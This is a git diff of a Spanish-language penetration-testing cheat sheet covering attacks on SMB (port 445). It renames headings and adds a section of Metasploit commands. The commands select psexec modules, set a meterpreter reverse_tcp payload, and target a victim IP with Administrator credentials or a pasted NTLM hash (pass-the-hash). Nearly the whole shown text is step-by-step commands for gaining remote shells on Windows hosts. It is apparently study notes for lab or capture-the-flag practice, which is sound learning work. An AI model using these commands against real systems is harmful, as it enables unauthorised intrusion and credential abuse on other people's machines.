@@ -98,7 +98,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 
 ## Puerto 445 
 
-## SMB
+## SMB / Psexec
 
 ```bash 
 # Usaremos el PsExec del puerto 135
@@ -111,8 +111,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ set SMBUser Administrator
 	❯ exploit 
 ```
-
-## Pass the hash
+##  Pass the hash / Psexec
 
 ```bash 
 ❯ use exploit/windows/smb/psexec        # Usamos el exploit para hacer pass the hash              
@@ -123,6 +122,20 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 ❯ set SMBPass <hash>                    # Pegamos todo el hash obtenido 
 ❯ set target Native\ upload 
 ❯ exploit
+```
+## Psexec 
+
+```bash 
+# Debemos de tener credenciales validas
+❯ msfconsole -q                                           # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/psexec_loggedin_users    # Usamos el auxiliar
+	❯ options
+	❯ set PAYLOAD windows/x64/meterpreter/reverse_tcp
+	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
+	❯ set SMBUser Administrator
+	❯ set SMBPass <Passwd>
+	❯ exploit 
 ```
 
 ## Samba 
